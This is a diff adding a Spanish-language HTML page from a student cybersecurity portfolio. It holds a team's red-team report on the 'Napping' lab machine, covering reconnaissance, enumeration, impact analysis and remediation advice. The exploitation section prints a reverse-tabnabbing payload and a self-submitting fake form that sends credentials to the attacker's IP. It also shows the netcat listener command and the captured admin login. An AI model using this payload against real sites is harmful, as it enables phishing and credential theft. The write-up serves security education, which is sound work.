@@ -1,0 +1,665 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Actividad 11 · Red Team Report · My File Server 1 (Napping)</title>
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+<style>
+@import url('https://fonts.googleapis.com/css2?family=Inter:wght@300;400;600;700&display=swap');
+
+* {
+  margin: 0;
+  padding: 0;
+  box-sizing: border-box;
+  font-family: 'Inter', sans-serif;
+}
+
+body {
+  min-height: 100vh;
+  background: linear-gradient(180deg, #fff5f9, #ffe0ec);
+  overflow-x: hidden;
+  color: #3a1c2b;
+}
+
+.blur {
+  position: absolute;
+  border-radius: 50%;
+  filter: blur(70px);
+  opacity: 0.6;
+  z-index: 0;
+  animation: float 6s ease-in-out infinite;
+}
+
+.blur.one {
+  width: 360px;
+  height: 360px;
+  background: #ff9ac1;
+  top: -120px;
+  left: -120px;
+}
+
+.blur.two {
+  width: 300px;
+  height: 300px;
+  background: #ffb3d9;
+  bottom: -100px;
+  right: -100px;
+  animation-delay: 2s;
+}
+
+.blur.three {
+  width: 240px;
+  height: 240px;
+  background: #ffc2e1;
+  top: 40%;
+  right: 20%;
+  animation-delay: 4s;
+}
+
+@keyframes float {
+  0%, 100% { transform: translateY(0px) scale(1); }
+  50% { transform: translateY(-20px) scale(1.05); }
+}
+
+.wrapper {
+  position: relative;
+  z-index: 1;
+  max-width: 1400px;
+  margin: 70px auto;
+  padding: 20px;
+}
+
+.card {
+  background: rgba(255,255,255,0.92);
+  backdrop-filter: blur(12px);
+  border-radius: 32px;
+  padding: 50px;
+  box-shadow: 0 40px 80px rgba(255,122,168,0.25), inset 0 1px 0 rgba(255,255,255,0.6);
+  transition: transform 0.5s ease;
+}
+
+.card:hover {
+  transform: translateY(-8px);
+  box-shadow: 0 50px 100px rgba(255,122,168,0.35);
+}
+
+.header {
+  text-align: center;
+  margin-bottom: 30px;
+}
+
+.header h1 {
+  font-size: 2.8rem;
+  font-weight: 700;
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  gap: 12px;
+  flex-wrap: wrap;
+}
+
+.alias {
+  font-size: 1rem;
+  font-weight: 400;
+  color: #ff4f9a;
+}
+
+.header h2 {
+  margin-top: 12px;
+  font-size: 1.4rem;
+  color: #ff4f9a;
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  gap: 8px;
+}
+
+.meta {
+  margin-top: 6px;
+  font-size: 0.95rem;
+  color: #6b3a52;
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  gap: 8px;
+  flex-wrap: wrap;
+}
+
+.equipo {
+  margin-top: 15px;
+  background: rgba(255,255,255,0.5);
+  border-radius: 28px;
+  padding: 15px 20px;
+  text-align: center;
+  font-size: 0.9rem;
+  color: #4a2a36;
+  border: 1px solid rgba(255,79,154,0.3);
+}
+
+.equipo i {
+  color: #ff4f9a;
+  margin-right: 8px;
+}
+
+nav ul {
+  display: flex;
+  justify-content: center;
+  flex-wrap: wrap;
+  gap: 18px;
+  list-style: none;
+  margin: 40px 0;
+}
+
+nav a {
+  text-decoration: none;
+  padding: 12px 24px;
+  border-radius: 999px;
+  background: rgba(255,255,255,0.7);
+  color: #3a1c2b;
+  font-weight: 600;
+  box-shadow: 0 8px 18px rgba(255,79,154,0.15);
+  transition: all 0.3s ease;
+  display: flex;
+  align-items: center;
+  gap: 8px;
+  border: 1px solid rgba(255,255,255,0.5);
+}
+
+nav a:hover, nav a.activo {
+  background: linear-gradient(135deg, #ff4f9a, #ff8fc4);
+  color: #fff;
+  transform: translateY(-3px) scale(1.05);
+  box-shadow: 0 16px 30px rgba(255,79,154,0.5);
+}
+
+nav ul li {
+  position: relative;
+}
+
+.submenu {
+  position: absolute;
+  top: 100%;
+  left: 0;
+  background: rgba(255,255,255,0.95);
+  backdrop-filter: blur(10px);
+  border-radius: 20px;
+  padding: 10px 0;
+  min-width: 200px;
+  box-shadow: 0 20px 40px rgba(255,79,154,0.3);
+  opacity: 0;
+  visibility: hidden;
+  transform: translateY(20px);
+  transition: all 0.3s ease;
+  z-index: 100;
+  list-style: none;
+  border: 1px solid rgba(255,255,255,0.5);
+}
+
+nav ul li:hover .submenu {
+  opacity: 1;
+  visibility: visible;
+  transform: translateY(10px);
+}
+
+.submenu a {
+  padding: 12px 24px;
+  border-radius: 999px;
+  background: rgba(255,255,255,0.7);
+  color: #3a1c2b;
+  font-weight: 600;
+  box-shadow: 0 8px 18px rgba(255,79,154,0.15);
+  transition: all 0.3s ease;
+  display: flex;
+  align-items: center;
+  gap: 8px;
+  border: 1px solid rgba(255,255,255,0.5);
+}
+
+.submenu a:hover {
+  background: linear-gradient(135deg, #ff4f9a, #ff8fc4);
+  color: #fff;
+  transform: translateY(-3px) scale(1.05);
+  box-shadow: 0 16px 30px rgba(255,79,154,0.5);
+}
+
+.titulo-actividad {
+  margin: 30px 0 25px;
+  display: flex;
+  align-items: center;
+  gap: 15px;
+  border-bottom: 5px solid #ff8fc4;
+  padding-bottom: 15px;
+}
+
+.titulo-actividad h3 {
+  font-size: 2.2rem;
+  color: #ff4f9a;
+  display: flex;
+  align-items: center;
+  gap: 12px;
+}
+
+.pdf-export {
+  display: flex;
+  justify-content: flex-end;
+  margin: 20px 0;
+}
+
+.btn-pdf {
+  background: linear-gradient(145deg, #ff4f9a, #ff2e7d);
+  border: none;
+  padding: 16px 36px;
+  border-radius: 50px;
+  color: white;
+  font-weight: 700;
+  font-size: 1.1rem;
+  display: flex;
+  align-items: center;
+  gap: 12px;
+  box-shadow: 0 15px 30px rgba(255,79,154,0.4);
+  transition: all 0.3s ease;
+  cursor: pointer;
+  border: 1px solid rgba(255,255,255,0.3);
+}
+
+.btn-pdf:hover {
+  transform: translateY(-5px);
+  box-shadow: 0 25px 45px rgba(255,79,154,0.5);
+}
+
+.seccion {
+  background: rgba(255,255,255,0.7);
+  border-radius: 28px;
+  padding: 35px;
+  margin-top: 40px;
+  box-shadow: 0 15px 35px rgba(255,122,168,0.15);
+  border-left: 6px solid #ff4f9a;
+  transition: transform 0.3s;
+}
+
+.seccion:hover {
+  transform: translateY(-5px);
+  box-shadow: 0 20px 45px rgba(255,79,154,0.2);
+}
+
+.seccion h4 {
+  font-size: 1.9rem;
+  color: #ff4f9a;
+  margin-bottom: 25px;
+  display: flex;
+  align-items: center;
+  gap: 12px;
+  border-bottom: 2px solid #ffe0ec;
+  padding-bottom: 12px;
+}
+
+.seccion h5 {
+  font-size: 1.4rem;
+  color: #4a2a36;
+  margin: 30px 0 20px;
+  display: flex;
+  align-items: center;
+  gap: 10px;
+}
+
+.tabla-container {
+  overflow-x: auto;
+  margin: 25px 0;
+  border-radius: 18px;
+  background: rgba(255,255,255,0.5);
+  padding: 5px;
+}
+
+table {
+  width: 100%;
+  border-collapse: collapse;
+  font-size: 0.98rem;
+}
+
+th {
+  background: linear-gradient(145deg, #ff4f9a, #ff8fc4);
+  color: white;
+  font-weight: 600;
+  padding: 15px 12px;
+  text-align: left;
+}
+
+td {
+  padding: 14px 12px;
+  border-bottom: 1px solid #ffe0ec;
+  background: rgba(255,255,255,0.7);
+}
+
+tr:hover td {
+  background: rgba(255,225,235,0.9);
+}
+
+pre {
+  background: #2d2a2e;
+  color: #f8f8f2;
+  padding: 20px;
+  border-radius: 20px;
+  overflow-x: auto;
+  font-family: 'Courier New', monospace;
+  font-size: 0.9rem;
+  margin: 20px 0;
+  box-shadow: inset 0 0 10px rgba(0,0,0,0.3);
+}
+
+code {
+  font-family: 'Courier New', monospace;
+}
+
+.lista-personalizada {
+  list-style: none;
+  padding-left: 0;
+}
+
+.lista-personalizada li {
+  padding: 10px 0;
+  display: flex;
+  align-items: baseline;
+  gap: 12px;
+  border-bottom: 1px solid #ffe0ec;
+}
+
+.lista-personalizada li i {
+  color: #ff4f9a;
+  width: 24px;
+  text-align: center;
+}
+
+.img-placeholder {
+  text-align: center;
+  margin: 20px 0;
+  background: rgba(255,240,245,0.6);
+  border-radius: 28px;
+  padding: 20px;
+  border: 1px dashed #ff9ac1;
+}
+
+.img-placeholder i {
+  font-size: 2rem;
+  color: #ff4f9a;
+  margin-bottom: 10px;
+}
+
+.footer {
+  width: 100%;
+  padding: 20px 0;
+  text-align: center;
+  background: rgba(0, 0, 0, 0.35);
+  border-top: 1px solid rgba(255, 255, 255, 0.1);
+  position: relative;
+  margin-top: 40px;
+}
+
+.footer-content {
+  color: #f3f3f3;
+  font-size: 14px;
+  opacity: 0.9;
+}
+
+.footer-content a {
+  color: #f3f3f3;
+  text-decoration: none;
+  font-weight: 500;
+}
+
+@media (max-width: 900px) {
+  .card { padding: 30px 20px; }
+  .header h1 { font-size: 2rem; flex-direction: column; }
+  .titulo-actividad h3 { font-size: 1.8rem; }
+  .seccion { padding: 25px; }
+  .seccion h4 { font-size: 1.6rem; }
+}
+</style>
+</head>
+<body>
+
+<div class="blur one"></div>
+<div class="blur two"></div>
+<div class="blur three"></div>
+
+<div class="wrapper">
+  <div class="card">
+
+    <!-- ENCABEZADO IGUAL AL DISEÑO -->
+    <div class="header">
+      <h1><i class="fas fa-user-secret"></i> Laura Ivon Montelongo Martínez<span class="alias">| Alias: Ivonne</span></h1>
+      <h2><i class="fas fa-shield-alt"></i> CNO V – Seguridad Informática</h2>
+      <p class="meta"><i class="fas fa-graduation-cap"></i> ITI · Universidad Politécnica de San Luis Potosí</p>
+      <p class="meta"><i class="far fa-calendar-alt"></i> Periodo: Enero – Junio 2026 · Reporte: 22 de Marzo del 2026</p>
+    </div>
+
+    <!-- NAVEGACIÓN IDÉNTICA -->
+    <nav>
+        <ul>
+          <li><a href="index.html"><i class="fas fa-home"></i> Inicio</a></li>
+          <li>
+            <a href="#"><i class="fas fa-laptop-code"></i> Actividades <i class="fas fa-chevron-down" style="font-size:0.8rem;"></i></a>
+            <ul class="submenu">
+              <li><a href="actividades.html"><i class="fas fa-file-alt"></i> Primer Parcial</a></li>
+              <li><a href="segundo-parcial.html"><i class="fas fa-file-alt"></i> Segundo Parcial</a></li>
+              <li><a href="tercer-parcial.html"><i class="fas fa-file-alt"></i> Tercer Parcial</a></li>
+            </ul>
+          </li>
+          <li>
+            <a href="#"><i class="fas fa-trophy"></i> ROAD TO HALL OF FAME <i class="fas fa-chevron-down" style="font-size:0.8rem;"></i></a>
+            <ul class="submenu">
+              <li><a href="road-to-hall-of-fame2.html#sql-injection"><i class="fas fa-database"></i> SQL Injection</a></li>
+            </ul>
+          </li>
+          <li><a href="notasMenu.html"><i class="fas fa-file-alt"></i> Notas</a></li>
+          <li>
+            <a href="#"><i class="fas fa-project-diagram"></i> Proyectos <i class="fas fa-chevron-down" style="font-size:0.8rem;"></i></a>
+            <ul class="submenu">
+              <li><a href="PR01.html"><i class="fas fa-file-alt"></i>PR01</a></li>
+              <li><a href="PR02_01.html"><i class="fas fa-file-alt"></i>PR02</a></li>
+            </ul>
+          </li>
+          <li><a href="certificados.html"><i class="fas fa-certificate"></i> Certificaciones</a></li>
+        </ul>
+      </nav>
+
+    <div class="titulo-actividad">
+      <h3><i class="fas fa-file-alt"></i> Actividad 11 · Red Team Report: Pentesting de “My File Server 1” (Napping)</h3>
+    </div>
+
+    <div class="pdf-export">
+      <button class="btn-pdf" onclick="window.open('act11-Equipo3.pdf', '_blank')"><i class="fas fa-file-pdf"></i> Abrir PDF de la actividad (simulación)</button>
+    </div>
+
+    <!-- DATOS DEL EQUIPO (PÁGINA 1 PDF) -->
+    <div class="seccion" style="margin-top: 20px;">
+      <h4><i class="fas fa-users"></i> Curso de Núcleo Optativo V: Seguridad Informática<br>Red Team Report: Pentesting de “My File Server 1”</h4>
+      <p><strong>Integrantes:</strong> Benites Rangel Cesar Yahir – 179091 · Cortes Beltran Carol Elizabeth – 177203 · Guerra Ramirez America Fabiola – 179888 · Larios Guerra Gustavo Michael – 178318 · Montelongo Martinez Laura Ivon – 177291 · Puente Luna Bruno Axel – 177876 · Rodríguez Moreno Cristian Alejandro – 181641</p>
+      <p><strong>Docente:</strong> Mtro. Servando López Contreras</p>
+      <p><strong>Grupo:</strong> T46A</p>
+    </div>
+
+    <!-- RESUMEN EJECUTIVO (PÁGINA 3) -->
+    <div class="seccion">
+      <h4><i class="fas fa-chart-line"></i> Resumen Ejecutivo</h4>
+      <p>Se realizó una evaluación de seguridad ofensiva sobre el servidor Napping. El análisis reveló debilidades críticas en la gestión de accesos y la configuración de servicios que permiten a un atacante externo obtener control total del sistema (acceso Root). La vulnerabilidad principal radica en una técnica de TabNapping en el servicio web, seguida de una mala configuración en las tareas programadas o permisos de usuario que facilitan la escalada de privilegios.</p>
+    </div>
+
+    <!-- ALCANCE -->
+    <div class="seccion">
+      <h4><i class="fas fa-bullseye"></i> Alcance</h4>
+      <p>El alcance de esta evaluación se limitó exclusivamente a la dirección IP asignada a la máquina Napping, evaluando los servicios expuestos, vulnerabilidades web y configuraciones internas del sistema operativo Linux.</p>
+    </div>
+
+    <!-- METODOLOGÍA APLICADA -->
+    <div class="seccion">
+      <h4><i class="fas fa-sitemap"></i> Metodología Aplicada</h4>
+      <p>Se utilizó la metodología estándar de pruebas de penetración:</p>
+      <ul class="lista-personalizada">
+        <li><i class="fas fa-search"></i> Reconocimiento: Identificación de la superficie de ataque.</li>
+        <li><i class="fas fa-list-ul"></i> Enumeración: Análisis profundo de servicios abiertos.</li>
+        <li><i class="fas fa-bolt"></i> Explotación: Ejecución de vectores de ataque para ganar acceso inicial.</li>
+        <li><i class="fas fa-rocket"></i> Post-Explotación: Escalada de privilegios y persistencia.</li>
+      </ul>
+    </div>
+
+    <!-- FASES DE RECONOCIMIENTO -->
+    <div class="seccion">
+      <h4><i class="fas fa-binoculars"></i> Fases de reconocimiento</h4>
+      <p>Utilizamos el comando <code>nmap -A</code> para realizar un escaneo avanzado de la dirección IP de la máquina objetivo. Este análisis permitió identificar los puertos abiertos, entre los cuales se encontraron el servicio SSH y el servicio HTTP activos.</p>
+      <div class="img-placeholder"><i class="fas fa-terminal"></i><br>Figura: Escaneo Nmap revelando puertos SSH (22) y HTTP (80).</div>
+      <p>Ingresamos la dirección IP de la máquina virtual en el navegador para visualizar el sitio web que se encuentra disponible y accesible desde el servicio HTTP.</p>
+      <div class="img-placeholder"><i class="fas fa-globe"></i><br>Captura: Página principal del servidor web en HTTP.</div>
+    </div>
+
+    <!-- ENUMERACIÓN -->
+    <div class="seccion">
+      <h4><i class="fas fa-list-ul"></i> Enumeración</h4>
+      <p>Utilizamos la herramienta DirBuster en su modo interactivo para realizar un análisis de fuerza bruta sobre el sitio web, con el objetivo de identificar los directorios y recursos accesibles que no se encuentran listados de forma visible.</p>
+      <div class="img-placeholder"><i class="fas fa-folder-open"></i><br>DirBuster escaneando directorios.</div>
+      <p>Posteriormente empleamos Gobuster junto con un diccionario de palabras para fuerza bruta dirigida, descubriendo rutas como /register.php.</p>
+      <p>Accedimos a uno de los directorios descubiertos durante la enumeración y encontramos una página que permite realizar el proceso de registro de usuarios. Desde este formulario creamos una cuenta nueva para continuar con el análisis del sitio.</p>
+      <div class="img-placeholder"><i class="fas fa-user-plus"></i><br>Formulario de registro (/register.php).</div>
+      <p>Accedimos al sitio después de completar el registro y se nos mostró una página de bienvenida. El sistema indica que los enlaces enviados serán revisados manualmente por el administrador, lo que sugiere un flujo de validación.</p>
+      <p>Utilizamos la combinación Ctrl+U en el navegador para visualizar el código fuente de la página, revisando comentarios y rutas ocultas.</p>
+    </div>
+
+    <!-- EXPLOTACIÓN: REVERSE TABNABBING -->
+    <div class="seccion">
+      <h4><i class="fas fa-bolt"></i> Explotación · Reverse Tabnabbing</h4>
+      <p>Se observó la configuración de red local (ifconfig) con IP 192.168.56.101 en el equipo atacante. Creamos un archivo payload.html con script malicioso de Reverse Tabnabbing que redirige la pestaña de la víctima hacia nuestra IP. También creamos fake.html para capturar credenciales.</p>
+      <pre>—(kali@kali)-[~/Desktop/Napping] $ cat payload.html
+&lt;html&gt; &lt;body&gt; &lt;script&gt; if (window.opener) { window.opener.location = "http://192.168.56.101/fake.html"; } &lt;/script&gt; &lt;/body&gt; &lt;/html&gt; 
+
+—(kali@kali)-[~/Desktop/Napping] $ cat fake.html
+&lt;body&gt; &lt;form action="http://192.168.56.101:8000" method="POST"&gt; &lt;input name="user" value="admin"&gt; &lt;input name="pass" value="password"&gt; &lt;input type="submit"&gt; &lt;/form&gt; &lt;script&gt; document.forms[0].submit(); &lt;/script&gt; &lt;/body&gt; </pre>
+      <p>Ejecutamos <code>python -m http.server 80</code> para alojar los archivos y <code>nc -lvnp 8000</code> para escuchar credenciales. Cuando el administrador revisó el enlace malicioso, capturamos las credenciales en texto claro:</p>
+      <pre>POST / HTTP/1.1
+Host: 192.168.56.101:8000
+Content-Length: 24
+user=admin&pass=password</pre>
+      <div class="img-placeholder"><i class="fas fa-user-lock"></i><br>Listener Netcat recibiendo credenciales admin / password.</div>
+    </div>
+
+    <!-- ESCALADA DE PRIVILEGIOS -->
+    <div class="seccion">
+      <h4><i class="fas fa-arrow-up"></i> Escalada de privilegios</h4>
+      <p>Al obtener las credenciales en texto plano, establecimos una conexión SSH a la máquina víctima. Al identificar al usuario encontramos que es del tipo administrador, lo que nos permitió acceso elevado.</p>
+      <div class="img-placeholder"><i class="fas fa-terminal"></i><br>Conexión SSH exitosa con credenciales robadas.</div>
+      <p>Mediante una mala configuración en tareas programadas (cron) y permisos débiles, logramos escalar privilegios hasta root, comprometiendo totalmente el servidor.</p>
+    </div>
+
+    <!-- ANÁLISIS DE IMPACTO (CIA) -->
+    <div class="seccion">
+      <h4><i class="fas fa-balance-scale"></i> Análisis de impacto</h4>
+      <div class="tabla-container">
+        <table>
+          <thead><tr><th>Pilar</th><th>Nivel</th><th>Impacto específico en Napping</th></tr></thead>
+          <tbody>
+            <tr><td>Confidencialidad</td><td>Alto</td><td>Acceso root permite lectura de todos los archivos: /etc/shadow, claves SSH, datos de almacenamiento de usuarios, credenciales de bases de datos. Se compromete toda la información corporativa.</td></tr>
+            <tr><td>Integridad</td><td>Alto</td><td>Modificación de scripts de backup, binarios del sistema, logs de auditoría, y posible corrupción de datos almacenados. El atacante puede instalar puertas traseras persistentes.</td></tr>
+            <tr><td>Disponibilidad</td><td>Moderado</td><td>Aunque no se explotó en la prueba, el control root permite detener servicios, eliminar datos, o cifrar información (ransomware), afectando gravemente la operación del servidor de archivos.</td></tr>
+          </tbody>
+        </table>
+      </div>
+    </div>
+
+    <!-- RECOMENDACIONES TÉCNICAS -->
+    <div class="seccion">
+      <h4><i class="fas fa-tools"></i> Recomendaciones técnicas</h4>
+      <h5>Seguridad en la aplicación web (TabNapping)</h5>
+      <ul class="lista-personalizada">
+        <li><i class="fas fa-heading"></i> Implementar cabeceras: X-Frame-Options: DENY y Content-Security-Policy: frame-ancestors 'none';</li>
+        <li><i class="fas fa-code"></i> Revisar código JavaScript para eliminar manipulaciones de window.opener.</li>
+        <li><i class="fas fa-sync-alt"></i> Forzar invalidación de sesiones y rotación de credenciales.</li>
+      </ul>
+      <h5>Hardening de tareas programadas (cron)</h5>
+      <ul class="lista-personalizada">
+        <li><i class="fas fa-clock"></i> Auditar todos los cron jobs con privilegios elevados.</li>
+        <li><i class="fas fa-lock"></i> Permisos estrictos: scripts propiedad root:root y permisos 750 o 700.</li>
+        <li><i class="fas fa-ban"></i> Eliminar escritura no autorizada en /etc/cron.d/, /var/spool/cron/.</li>
+      </ul>
+      <h5>Control de privilegios y permisos del sistema</h5>
+      <ul class="lista-personalizada">
+        <li><i class="fas fa-user-shield"></i> Endurecer sudoers: eliminar reglas que permitan ejecución sin contraseña.</li>
+        <li><i class="fas fa-umask"></i> Establecer umask en 027 o 077.</li>
+        <li><i class="fas fa-chalkboard-user"></i> Aislar servicios con cuentas sin shell interactivo.</li>
+      </ul>
+    </div>
+
+    <!-- TABLA DE HALLAZGOS (VULN-01, VULN-02, VULN-03) -->
+    <div class="seccion">
+      <h4><i class="fas fa-exclamation-triangle"></i> Tabla de hallazgos</h4>
+      <div class="tabla-container">
+        <table>
+          <thead><tr><th>ID</th><th>Vulnerabilidad</th><th>Severidad</th><th>Evidencia</th><th>Impacto</th><th>Recomendación</th></tr></thead>
+          <tbody>
+            <tr><td>VULN-01</td><td>Ejecución de Reverse Tabnabbing (Manipulación de sesión en cliente)</td><td>Crítica</td><td>Desarrollo y alojamiento de payload.html con script malicioso en servidor Python local. Listener nc capturó credenciales en texto claro.</td><td>Robo de credenciales administrativas mediante secuestro de pestaña, acceso SSH.</td><td>Añadir rel="noopener noreferrer" en enlaces salientes. Implementar X-Frame-Options: DENY.</td></tr>
+            <tr><td>VULN-02</td><td>Escalada de Privilegios Locales vía Tareas Programadas (Cron)</td><td>Crítica</td><td>Tras acceso inicial SSH, mala configuración en cron jobs y permisos de usuario permitieron elevar privilegios.</td><td>Ejecución de código arbitrario con permisos root, compromiso total CIA.</td><td>Auditar cron jobs. Scripts con propiedad root:root, permisos 750. Endurecer sudoers.</td></tr>
+            <tr><td>VULN-03</td><td>Exposición de Directorios Sensibles y Registro de Usuarios Abierto</td><td>Media</td><td>Enumeración forzada con DirBuster y Gobuster reveló /index.php y /register.php, permitiendo crear cuenta de ataque.</td><td>Cualquier actor externo puede registrarse y enviar enlaces maliciosos para revisión manual.</td><td>Deshabilitar registro público si no es necesario. Implementar validación de usuarios y ocultar directorios.</td></tr>
+          </tbody>
+        </table>
+      </div>
+    </div>
+
+    <!-- CONTEXTO ADICIONAL Y NIVEL DE RIESGO (PÁGINAS 20-23) -->
+    <div class="seccion">
+      <h4><i class="fas fa-chart-simple"></i> Contexto · Nivel general del riesgo</h4>
+      <p><strong>Objetivo:</strong> Evaluar la resistencia del servidor de almacenamiento corporativo (Napping) frente a un ataque real.<br>
+      <strong>Alcance adicional:</strong> Servidor expuesto a internet, caja negra. Duración: 6 horas y 30 minutos.<br>
+      <strong>Resultados:</strong> Compromiso total del sistema (acceso root). Acceso no autorizado al servicio de almacenamiento y persistencia a través de tareas programadas.</p>
+      <div style="background:#ffd9e6; border-radius:2rem; padding:1.5rem; text-align:center; margin:20px 0"><strong style="color:#c2185b">RIESGO CRÍTICO.</strong> Se recomienda aplicar medidas de remediación de forma inmediata para evitar un incidente de seguridad con impacto en la operación y confidencialidad de datos corporativos.</div>
+      <div class="img-placeholder"><i class="fas fa-chart-pie"></i><br>Matriz de riesgo (probabilidad vs impacto) → Riesgo global: CRITICO - requiere acción inmediata.</div>
+    </div>
+
+    <!-- RECOMENDACIONES ESTRATÉGICAS Y PLAN DE RESPUESTA -->
+    <div class="seccion">
+      <h4><i class="fas fa-road"></i> Recomendaciones Estratégicas y Plan de respuesta</h4>
+      <ul class="lista-personalizada">
+        <li><i class="fas fa-bug"></i> <strong>Corregir vulnerabilidad web de forma inmediata:</strong> cabeceras antiframing, regeneración de sesiones, rotar contraseñas.</li>
+        <li><i class="fas fa-chart-line"></i> <strong>Controles de prevención y detección:</strong> desplegar monitoreo de integridad (Wazuh/OSSEC), centralizar logs.</li>
+        <li><i class="fas fa-microchip"></i> <strong>Endurecer sistema operativo:</strong> auditar permisos de cron, mínimo privilegio, eliminar SUID innecesarios.</li>
+        <li><i class="fas fa-fire-extinguisher"></i> <strong>Plan de respuesta ante incidentes:</strong> procedimientos de rotación de credenciales y reinstalación segura ante compromiso de root.</li>
+      </ul>
+      <div style="display:flex; flex-wrap:wrap; gap:1rem; margin-top:20px;">
+        <div style="background:#ffe0ec; border-radius:20px; padding:1rem; flex:1; text-align:center"><strong>Fase 1: Inmediata (48h)</strong><br>Implementar cabeceras, rotar contraseñas, corregir permisos de scripts.</div>
+        <div style="background:#ffe0ec; border-radius:20px; padding:1rem; flex:1; text-align:center"><strong>Fase 2: Corto plazo (10d)</strong><br>Auditar cron jobs, eliminar binarios 777, reintegrar ejecución segura.</div>
+        <div style="background:#ffe0ec; border-radius:20px; padding:1rem; flex:1; text-align:center"><strong>Fase 3: Mediano plazo (30d)</strong><br>Desplegar monitoreo de integridad, centralizar logs, nueva prueba de penetración.</div>
+        <div style="background:#ffe0ec; border-radius:20px; padding:1rem; flex:1; text-align:center"><strong>Fase 4: Continua</strong><br>Capacitación, actualización plan de respuesta, revisiones periódicas.</div>
+      </div>
+    </div>
+
+    <!-- CONCLUSIÓN FINAL (PÁGINA 24) -->
+    <div class="seccion">
+      <h4><i class="fas fa-check-circle"></i> Conclusión</h4>
+      <p><strong>Situación actual:</strong> El servidor Napping presenta vulnerabilidades críticas que exponen a la organización a un riesgo de compromiso total.<br>
+      <strong>Impacto potencial:</strong> Pérdida de datos, interrupción de operaciones y daño reputacional severo.<br>
+      <strong>Acción requerida:</strong> Implementar de forma prioritaria las correcciones inmediatas, especialmente en seguridad web y endurecimiento del sistema.<br>
+      <strong>Recomendación final:</strong> Establecer un programa continuo de evaluaciones de seguridad y monitoreo para evitar recurrencias.</p>
+    </div>
+
+    <!-- REFLEXIÓN TÉCNICA (basada en el espíritu del informe) -->
+    <div class="seccion">
+      <h4><i class="fas fa-lightbulb"></i> Reflexión técnica</h4>
+      <p>El ataque de Reverse Tabnabbing evidenció cómo un simple descuido en el manejo de enlaces y ventanas puede derivar en el robo de credenciales administrativas. La combinación con una mala configuración de tareas programadas permitió la escalada a root, demostrando la importancia del hardening y la revisión continua de cron jobs. Este ejercicio reafirma que la seguridad debe aplicarse en capas: desde el desarrollo seguro de la aplicación hasta la configuración del sistema operativo, incluyendo monitorización activa. La rotación periódica de credenciales y la implementación de cabeceras de seguridad son medidas de alto impacto que mitigan esta cadena de ataque.</p>
+    </div>
+  
+  </div> <!-- fin card -->
+</div> <!-- fin wrapper -->
+
+<footer class="footer">
+  <div class="footer-content">
+    <p>© 2026 <strong>Laura Ivon Montelongo Martínez</strong> · Portafolio de Ciberseguridad</p>
+    <p><a href="mailto:177291@upslp.edu.mx">177291@upslp.edu.mx</a></p>
+    <p>Equipo 3 · Red Team Report · Pentesting “My File Server 1” (Napping) · Actividad 11</p>
+  </div>
+</footer>
+
+<script>
+  document.querySelectorAll('.btn-pdf').forEach(btn => {
+    btn.addEventListener('click', () => console.log('Simulación: descarga del PDF act11-Equipo3.pdf'));
+  });
+</script>
+
+</body>
+</html>
